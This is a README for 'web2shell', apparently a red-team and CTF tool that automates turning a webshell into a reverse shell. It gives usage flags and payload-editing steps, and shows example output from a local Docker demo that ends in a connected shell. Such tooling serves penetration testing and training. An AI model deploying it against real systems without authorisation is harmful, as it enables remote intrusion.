# web2shell

A Python program used to automate converting webshells into reverse shells. If you regularly do CTF, HTB, or red teaming you've probably spent a good chunk of time testing payloads to convert a webshell into a reverse shell. This tool aims to simplify this process.

Credit for the reverse shells goes to [PayloadAllTheThings.](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Usage

```
usage: web2shell.py [-h] --url URL [--interface INTERFACE] [--force FORCE] [--ip IP] [--port PORT] [--nc NC]

options:
  -h, --help            show this help message and exit
  --url URL             webshell URL, replace the provided command with "SHELL". ex: https://example.com/shell.php?cmd=SHELL
  --interface INTERFACE
                        the interface to use when listening for a remote shell. Default is localhost.
  --force FORCE         force command execution even if initial check is invalid, must be true or false
  --ip IP               IP address of your own listener (skips listener setup)
  --port PORT           port of your own listener (skips listener setup)
  --nc NC               path to local nc binary
```

The only **required** flag is the `url.`

Please note: this program currently is only intended to be used on and against Linux machines.

## Requirements

All of the Python libraries used should be included in base Python. You will need a copy of `nc`. The program will attempt to find it automatically. If it can't, please specify the path with the `--nc` flag.

## Adding New Payloads

The included payloads have all been tested on a simple webshell and work. If you'd like to add more, please feel free.

- Edit the `data/payloads.py` file.
- Add a new object to the `payloads` dict. The `key` should be the name of the bin, and the value should be a `list` object of payloads.
- Replace all instances of the reverse `IP` with `IPHERE`, the port with `PORTHERE`, and the binary name with `PATHHERE`.

## Example

Example execution on local Docker image (see `demo/README.md`)

```
[evan@ejedev web2shell]$ python3 web2shell.py  --url http://127.0.0.1:8080/cmd.php?cmd=SHELL --interface docker0

               o                  o           o  o
               O     .oOOo.       O           O  O
               O          O       o           o  o
               o          o       O           O  O
'o     O .oOo. OoOo.     O' .oOo  OoOo. .oOo. o  o
 O  o  o OooO' O   o    O   `Ooo. o   o OooO' O  O
 o  O  O O     o   O  .O        O o   O O     o  o
 `Oo'oO' `OoO' `OoO' oOoOoO `OoO' O   o `OoO' Oo Oo
---------------------------------------------------
                      @ejedev

Verifying commands can be executed...
Available interfaces...
[-] lo
[-] enp4s0
[-] docker0
[-] br-7436527ee366
[-] br-aa3534e13396
[-] br-c7551daa06d2
[-] veth87ee241
docker0 selected. Address to use is 172.17.0.1
Testing ports...
[-] 1025 available!
Finding local nc binary...
nc target at /usr/bin/nc
Final connection string will be 172.17.0.1:1025...
Finding bins...
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1025
Ncat: Listening on 0.0.0.0:1025
[-] perl found at /usr/bin/perl
[-] perl found at /usr/bin/perl5.32-x86_64-linux-gnu
[-] php found at /usr/local/bin/php
[-] python found at /usr/bin/python3.9
Executing reverse shell...
Bins to test: 4
[!] Attempting perl payloads for path /usr/bin/perl
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:54256.
$
```
